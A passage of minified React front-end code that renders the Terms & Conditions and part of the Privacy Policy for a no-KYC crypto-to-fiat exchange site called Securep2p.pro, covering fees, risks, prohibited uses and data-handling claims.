                        className: `${e ? "bg-blue-900/20" : "bg-blue-50"} border ${e ? "border-blue-800" : "border-blue-200"} rounded-xl p-4 mb-4`,
                        children: a.jsxs("div", {
                            className: "flex items-start space-x-3",
                            children: [a.jsx(Ki, {
                                className: "w-5 h-5 text-orange-600 mt-0.5 flex-shrink-0"
                            }), a.jsxs("div", {
                                className: `text-sm ${e ? "text-blue-300" : "text-blue-800"}`,
                                children: [a.jsx("strong", {
                                    children: "Important:"
                                }), " By using Securep2p.pro, you agree to these terms. Please read carefully before proceeding with any transactions."]
                            })]
                        })
                    }), a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(cf, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "1. Agreement to Terms"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: 'By accessing and using Securep2p.pro ("the Platform"), you accept and agree to be bound by the terms and provision of this agreement. If you do not agree to abide by the above, please do not use this service. These terms constitute a legally binding agreement between you and Securep2p.pro.'
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro reserves the right to modify these terms at any time without prior notice. Your continued use of the platform after any such changes constitutes your acceptance of the new terms. It is your responsibility to review these terms periodically."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Ot, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "2. Service Description"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro is a decentralized cryptocurrency exchange platform that allows users to convert digital assets to fiat currency without traditional KYC requirements. Our services include:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Cryptocurrency to fiat currency conversion"
                        }), a.jsx("li", {
                            children: "• Multi-currency support (USD, EUR, INR, GBP, etc.)"
                        }), a.jsx("li", {
                            children: "• Various payout methods (Bank Transfer, UPI, PayPal, etc.)"
                        }), a.jsx("li", {
                            children: "• Real-time exchange rates with transparent fees"
                        }), a.jsx("li", {
                            children: "• Secure wallet integration via Web3"
                        }), a.jsx("li", {
                            children: "• No account registration or KYC verification required"
                        }), a.jsx("li", {
                            children: "• Direct wallet-to-wallet transactions"
                        }), a.jsx("li", {
                            children: "• Instant settlement to your chosen payment method"
                        }), a.jsx("li", {
                            children: "• 24/7 automated processing"
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "Important:"
                        }), " Securep2p.pro operates as a non-custodial platform. We do not hold, store, or have access to your cryptocurrency assets. All transactions are processed directly from your connected wallet."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(ps, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "3. User Responsibilities"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "By using Securep2p.pro, users acknowledge and agree to the following responsibilities:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Providing accurate payment details for successful fund transfers"
                        }), a.jsx("li", {
                            children: "• Maintaining the security of their wallet and private keys"
                        }), a.jsx("li", {
                            children: "• Complying with local laws and regulations"
                        }), a.jsx("li", {
                            children: "• Verifying transaction details before confirmation"
                        }), a.jsx("li", {
                            children: "• Understanding the risks associated with cryptocurrency trading"
                        }), a.jsx("li", {
                            children: "• Ensuring they have legal ownership of all cryptocurrencies being exchanged"
                        }), a.jsx("li", {
                            children: "• Confirming that their payment method accepts the intended transfer amount"
                        }), a.jsx("li", {
                            children: "• Being responsible for any taxes or fees imposed by their jurisdiction"
                        }), a.jsx("li", {
                            children: "• Not using the platform for any illegal activities or money laundering"
                        }), a.jsx("li", {
                            children: "• Accepting that all transactions are final and irreversible"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Users must be at least 18 years old or the legal age of majority in their jurisdiction to use this platform. By using Securep2p.pro, you represent and warrant that you meet this age requirement."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Fn, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "4. No KYC Policy"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro operates as a decentralized, non-custodial platform that does not require traditional Know Your Customer (KYC) verification. We believe in financial privacy and user autonomy."
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "What we collect:"
                        }), " Only the payment information necessary to process your fiat currency transfer (bank details, UPI ID, PayPal email, etc.)."]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "What we don't collect:"
                        }), " Government-issued IDs, proof of address, income verification, or personal identification documents."]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "However, users are responsible for complying with their local laws and regulations. Some jurisdictions may require individuals to report cryptocurrency transactions for tax purposes."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(qr, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "5. Fees and Charges"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro operates with transparent pricing. All fees are clearly displayed before transaction confirmation and include:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Exchange rate markup (typically 15-25%)"
                        }), a.jsx("li", {
                            children: "• Payment method processing fees"
                        }), a.jsx("li", {
                            children: "• Network transaction fees (gas fees)"
                        }), a.jsx("li", {
                            children: "• Currency conversion fees where applicable"
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "No Hidden Fees:"
                        }), " We do not charge any additional fees beyond what is displayed during the transaction process. The final amount you receive will match the quote provided before confirmation."]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "Fee Structure:"
                        }), " Our fees are competitive and designed to cover operational costs, payment processing, and platform maintenance. Fees may vary based on market conditions, payment method, and transaction volume."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Ki, {
                            className: "w-5 h-5 mr-2 text-orange-600"
                        }), "6. Risk Disclosure"]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "IMPORTANT RISK WARNING:"
                        }), " Cryptocurrency trading and exchange involves substantial risk of loss. By using Securep2p.pro, users acknowledge and accept the following risks:"]
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Cryptocurrency values are highly volatile"
                        }), a.jsx("li", {
                            children: "• Past performance does not guarantee future results"
                        }), a.jsx("li", {
                            children: "• Technical issues may cause delays or failures"
                        }), a.jsx("li", {
                            children: "• Regulatory changes may affect service availability"
                        }), a.jsx("li", {
                            children: "• Blockchain transactions are irreversible once confirmed"
                        }), a.jsx("li", {
                            children: "• Smart contract risks and potential vulnerabilities"
                        }), a.jsx("li", {
                            children: "• Market manipulation and liquidity risks"
                        }), a.jsx("li", {
                            children: "• Potential loss of funds due to user error"
                        }), a.jsx("li", {
                            children: "• Internet connectivity and technical infrastructure risks"
                        }), a.jsx("li", {
                            children: "• Third-party payment processor risks and delays"
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "No Investment Advice:"
                        }), " Securep2p.pro does not provide investment, financial, or trading advice. All decisions to exchange cryptocurrency are made solely by the user."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "7. Platform Availability"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro strives to maintain 99.9% uptime, but we cannot guarantee uninterrupted service. The platform may be temporarily unavailable due to:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Scheduled maintenance and updates"
                        }), a.jsx("li", {
                            children: "• Emergency security measures"
                        }), a.jsx("li", {
                            children: "• Third-party service provider issues"
                        }), a.jsx("li", {
                            children: "• Network congestion or blockchain issues"
                        }), a.jsx("li", {
                            children: "• Regulatory compliance requirements"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We will make reasonable efforts to provide advance notice of scheduled maintenance through our platform notifications."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "8. Limitation of Liability"
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "MAXIMUM LIABILITY LIMITATION:"
                        }), " To the fullest extent permitted by law, Securep2p.pro's total liability for any claims arising from or related to the use of our platform shall not exceed the amount of fees paid by you in the transaction giving rise to the claim."]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro shall not be liable for any indirect, incidental, special, consequential, or punitive damages, including without limitation:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Loss of profits, revenue, or business opportunities"
                        }), a.jsx("li", {
                            children: "• Loss of data or information"
                        }), a.jsx("li", {
                            children: "• Loss of goodwill or reputation"
                        }), a.jsx("li", {
                            children: "• Market losses due to price volatility"
                        }), a.jsx("li", {
                            children: "• Losses due to third-party actions or failures"
                        }), a.jsx("li", {
                            children: "• Losses due to regulatory changes"
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "9. Prohibited Uses"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Users are strictly prohibited from using Securep2p.pro for:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Money laundering or terrorist financing"
                        }), a.jsx("li", {
                            children: "• Fraud, theft, or any illegal activities"
                        }), a.jsx("li", {
                            children: "• Circumventing economic sanctions or embargoes"
                        }), a.jsx("li", {
                            children: "• Trading stolen or illegally obtained cryptocurrencies"
                        }), a.jsx("li", {
                            children: "• Market manipulation or insider trading"
                        }), a.jsx("li", {
                            children: "• Violating any applicable laws or regulations"
                        }), a.jsx("li", {
                            children: "• Attempting to hack, disrupt, or compromise platform security"
                        }), a.jsx("li", {
                            children: "• Creating multiple accounts to circumvent platform limits"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro reserves the right to refuse service, block transactions, or report suspicious activities to relevant authorities."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(lm, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "10. Privacy and Data Protection"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Your privacy is fundamental to our platform design. Securep2p.pro follows privacy-by-design principles:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• We collect only the minimum data necessary for payment processing"
                        }), a.jsx("li", {
                            children: "• No personal identification documents are required"
                        }), a.jsx("li", {
                            children: "• Payment data is encrypted and securely transmitted"
                        }), a.jsx("li", {
                            children: "• We do not sell or share your data with third parties"
                        }), a.jsx("li", {
                            children: "• Transaction data is automatically purged after completion"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Please review our Privacy Policy for detailed information about our data practices."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "11. Dispute Resolution"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "In the event of any dispute arising from the use of Securep2p.pro:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• First, contact our support team at support@Securep2p.pro"
                        }), a.jsx("li", {
                            children: "• We will attempt to resolve disputes within 48 hours"
                        }), a.jsx("li", {
                            children: "• If unresolved, disputes may be subject to binding arbitration"
                        }), a.jsx("li", {
                            children: "• Arbitration will be conducted under international arbitration rules"
                        }), a.jsx("li", {
                            children: "• Users waive the right to participate in class action lawsuits"
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "12. Governing Law"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "These Terms & Conditions shall be governed by and construed in accordance with international commercial law principles. Any legal proceedings shall be conducted in English language."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "13. Modifications to Terms"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro reserves the right to modify these terms at any time. Material changes will be communicated through:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Platform notifications during your next visit"
                        }), a.jsx("li", {
                            children: '• Updates to the "Last updated" date on this page'
                        }), a.jsx("li", {
                            children: "• Email notifications if you have provided contact information"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Continued use of the platform after modifications constitutes acceptance of the updated terms."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "14. Severability"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "If any provision of these Terms & Conditions is found to be unenforceable or invalid, that provision will be limited or eliminated to the minimum extent necessary so that the remaining terms remain in full force and effect."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Me, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "15. Contact Information"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "For questions, concerns, or support regarding these Terms & Conditions, please contact us:"
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                        children: [a.jsx("p", {
                            className: `${t.text} font-medium`,
                            children: "Securep2p.pro Support"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "General Support: support@Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Legal Inquiries: legal@Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Website: https://Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Response time: Within 24 hours"
                        })]
                    }), a.jsx("div", {
                        className: `mt-4 ${e ? "bg-blue-900/20" : "bg-blue-50"} border ${e ? "border-blue-800" : "border-blue-200"} rounded-xl p-4`,
                        children: a.jsxs("p", {
                            className: `text-sm ${e ? "text-blue-300" : "text-blue-800"}`,
                            children: [a.jsx("strong", {
                                children: "Effective Date:"
                            }), " These Terms & Conditions are effective as of January 1, 2025, and will remain in effect until modified or terminated."]
                        })
                    })]
                })]
            })
        })]
    })
})
  , Vf = ({darkMode: e, themeClasses: t, onClose: n}) => a.jsx("div", {
    className: "fixed inset-0 bg-black/50 backdrop-blur-sm z-[9999] flex items-center justify-center p-4",
    children: a.jsxs("div", {
        className: `${t.cardBg} rounded-3xl shadow-2xl max-w-4xl w-full max-h-[90vh] overflow-hidden border-2 ${e ? "border-blue-800" : "border-blue-200"}`,
        children: [a.jsxs("div", {
            className: `bg-gradient-to-r ${e ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} p-6 border-b ${t.border} relative`,
            children: [a.jsx("button", {
                onClick: n,
                className: `absolute top-4 right-4 p-2 rounded-full ${t.hover} transition-colors`,
                children: a.jsx(fs, {
                    className: `w-5 h-5 ${t.textSecondary}`
                })
            }), a.jsxs("div", {
                className: "flex items-center space-x-3",
                children: [a.jsx("div", {
                    className: `w-12 h-12 bg-gradient-to-r ${t.gradient} rounded-2xl flex items-center justify-center shadow-lg`,
                    children: a.jsx(Sc, {
                        className: "w-6 h-6 text-white"
                    })
                }), a.jsxs("div", {
                    children: [a.jsx("h2", {
                        className: `text-2xl font-bold ${t.text}`,
                        children: "Privacy Policy"
                    }), a.jsx("p", {
                        className: `text-sm ${t.textSecondary}`,
                        children: "Securep2p.pro - Last updated: January 2025"
                    })]
                })]
            })]
        }), a.jsx("div", {
            className: "p-6 overflow-y-auto max-h-[calc(90vh-120px)]",
            children: a.jsxs("div", {
                className: "space-y-8",
                children: [a.jsxs("section", {
                    children: [a.jsx("div", {
                        className: `${e ? "bg-green-900/20" : "bg-green-50"} border ${e ? "border-green-800" : "border-green-200"} rounded-xl p-4 mb-4`,
                        children: a.jsxs("div", {
                            className: "flex items-start space-x-3",
                            children: [a.jsx(Fn, {
                                className: "w-5 h-5 text-green-600 mt-0.5 flex-shrink-0"
                            }), a.jsxs("div", {
                                className: `text-sm ${e ? "text-green-300" : "text-green-800"}`,
                                children: [a.jsx("strong", {
                                    children: "Privacy-First Approach:"
                                }), " Securep2p.pro is built on privacy-by-design principles. We collect only the minimum data necessary for payment processing and never require personal identification documents."]
                            })]
                        })
                    }), a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Sc, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "1. Information We Collect"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Unlike traditional exchanges, Securep2p.pro operates with minimal data collection. We only collect information necessary for payment processing and platform functionality:"
                    }), a.jsxs("div", {
                        className: "space-y-4",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Payment Information Only:"
                            }), a.jsxs("ul", {
                                className: `${t.textSecondary} space-y-1 ml-4`,
                                children: [a.jsx("li", {
                                    children: "• Wallet addresses and transaction data"
                                }), a.jsx("li", {
                                    children: "• Contact information (email, phone, Telegram) - optional for notifications"
                                }), a.jsx("li", {
                                    children: "• Payment method details (bank accounts, UPI IDs, PayPal emails)"
                                }), a.jsx("li", {
                                    children: "• Transaction amounts and currency preferences"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-red-900/20" : "bg-red-50"} border ${e ? "border-red-800" : "border-red-200"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-red-300" : "text-red-800"} mb-2`,
                                children: "What We DON'T Collect:"
                            }), a.jsxs("ul", {
                                className: `${e ? "text-red-400" : "text-red-700"} space-y-1 ml-4`,
                                children: [a.jsx("li", {
                                    children: "• Government-issued ID documents"
                                }), a.jsx("li", {
                                    children: "• Proof of address or residence"
                                }), a.jsx("li", {
                                    children: "• Social security numbers or tax IDs"
                                }), a.jsx("li", {
                                    children: "• Income verification or employment details"
                                }), a.jsx("li", {
                                    children: "• Biometric data or photographs"
                                }), a.jsx("li", {
                                    children: "• Credit history or financial background"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Technical Information:"
                            }), a.jsxs("ul", {
                                className: `${t.textSecondary} space-y-1 ml-4`,
                                children: [a.jsx("li", {
                                    children: "• IP addresses and device information"
                                }), a.jsx("li", {
                                    children: "• Browser type and version"
                                }), a.jsx("li", {
                                    children: "• Basic usage analytics (anonymized)"
                                }), a.jsx("li", {
                                    children: "• Transaction timestamps and amounts"
                                }), a.jsx("li", {
                                    children: "• Blockchain transaction hashes"
                                }), a.jsx("li", {
                                    children: "• Error logs for troubleshooting"
                                })]
                            })]
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(_i, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "2. How We Use Your Information"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We use the minimal information we collect solely for the following purposes:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Process cryptocurrency exchange transactions"
                        }), a.jsx("li", {
                            children: "• Transfer funds to your specified payment method"
                        }), a.jsx("li", {
                            children: "• Send transaction confirmations and status updates"
                        }), a.jsx("li", {
                            children: "• Provide customer support and respond to inquiries"
                        }), a.jsx("li", {
                            children: "• Detect and prevent fraud and security threats"
                        }), a.jsx("li", {
                            children: "• Improve our services and user experience"
                        }), a.jsx("li", {
                            children: "• Maintain platform security and stability"
                        }), a.jsx("li", {
                            children: "• Generate anonymized analytics for platform improvement"
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "We do NOT use your information for:"
                        }), " Marketing, advertising, profiling, selling to third parties, or any purpose beyond transaction processing and platform operation."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(ps, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "3. Information Sharing"]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "Zero Data Selling Policy:"
                        }), " We never sell, trade, rent, or monetize your personal information. We may share limited information only in these specific circumstances:"]
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• With payment processors to complete transactions"
                        }), a.jsx("li", {
                            children: "• With blockchain networks for transaction processing"
                        }), a.jsx("li", {
                            children: "• With law enforcement when legally compelled by valid court orders"
                        }), a.jsx("li", {
                            children: "• With essential service providers under strict confidentiality agreements"
                        }), a.jsx("li", {
                            children: "• To protect against fraud, security threats, or illegal activities"
                        }), a.jsx("li", {
                            children: "• With your explicit consent"
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "Third-Party Services:"
                        }), " We work with payment processors and blockchain infrastructure providers who may process your data. These partners are contractually bound to protect your information and use it only for transaction processing."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(lm, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "4. Data Security"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro implements military-grade security measures to protect your information:"
                    }), a.jsxs("div", {
                        className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-blue-900/20" : "bg-blue-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-blue-300" : "text-blue-800"} mb-2`,
                                children: "Encryption"
                            }), a.jsx("p", {
                                className: `text-sm ${e ? "text-blue-400" : "text-blue-700"}`,
                                children: "AES-256 encryption for all data, TLS 1.3 for transmission, end-to-end encryption for sensitive data"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-green-900/20" : "bg-green-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-green-300" : "text-green-800"} mb-2`,
                                children: "Access Control"
                            }), a.jsx("p", {
                                className: `text-sm ${e ? "text-green-400" : "text-green-700"}`,
                                children: "Zero-trust architecture, multi-factor authentication, role-based access controls"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-purple-900/20" : "bg-purple-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-purple-300" : "text-purple-800"} mb-2`,
                                children: "Monitoring"
                            }), a.jsx("p", {
                                className: `text-sm ${e ? "text-purple-400" : "text-purple-700"}`,
                                children: "24/7 SOC monitoring, AI-powered threat detection, real-time anomaly detection"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-orange-900/20" : "bg-orange-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-orange-300" : "text-orange-800"} mb-2`,
                                children: "Audits"
                            }), a.jsx("p", {
                                className: `text-sm ${e ? "text-orange-400" : "text-orange-700"}`,
                                children: "Quarterly penetration testing, annual security audits, continuous vulnerability assessments"
                            })]
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4 mb-4`,
                        children: [a.jsx("h4", {
                            className: `font-semibold ${t.text} mb-2`,
                            children: "Additional Security Measures:"
                        }), a.jsxs("ul", {
                            className: `${t.textSecondary} space-y-1 ml-4 text-sm`,
                            children: [a.jsx("li", {
                                children: "• Data minimization - we collect only what's absolutely necessary"
                            }), a.jsx("li", {
                                children: "• Automatic data purging after transaction completion"
                            }), a.jsx("li", {
                                children: "• Distributed infrastructure with no single point of failure"
                            }), a.jsx("li", {
                                children: "• Regular security training for all team members"
                            }), a.jsx("li", {
                                children: "• Incident response plan with 15-minute response time"
                            }), a.jsx("li", {
                                children: "• Bug bounty program for continuous security improvement"
                            })]
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "5. Data Minimization Principle"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro follows strict data minimization principles:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "Purpose Limitation:"
                            }), " Data is collected only for specific, legitimate purposes"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "Storage Limitation:"
                            }), " Data is kept only as long as necessary"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "Data Quality:"
                            }), " We ensure data accuracy and keep it up to date"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "Transparency:"
                            }), " Clear communication about what data we collect and why"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "User Control:"
                            }), " You can request deletion of your data at any time"]
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "This approach significantly reduces your privacy risk compared to traditional exchanges that collect extensive personal information."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "6. Automatic Data Deletion"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "To protect your privacy, we automatically delete data according to the following schedule:"
                    }), a.jsxs("div", {
                        className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-green-900/20" : "bg-green-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-green-300" : "text-green-800"} mb-2`,
                                children: "Immediate Deletion"
                            }), a.jsxs("ul", {
                                className: `text-sm ${e ? "text-green-400" : "text-green-700"} space-y-1`,
                                children: [a.jsx("li", {
                                    children: "• Payment details after successful transfer"
                                }), a.jsx("li", {
                                    children: "• Temporary session data"
                                }), a.jsx("li", {
                                    children: "• Cached user preferences"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-blue-900/20" : "bg-blue-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-blue-300" : "text-blue-800"} mb-2`,
                                children: "30-Day Deletion"
                            }), a.jsxs("ul", {
                                className: `text-sm ${e ? "text-blue-400" : "text-blue-700"} space-y-1`,
                                children: [a.jsx("li", {
                                    children: "• Transaction logs and history"
                                }), a.jsx("li", {
                                    children: "• Support conversation records"
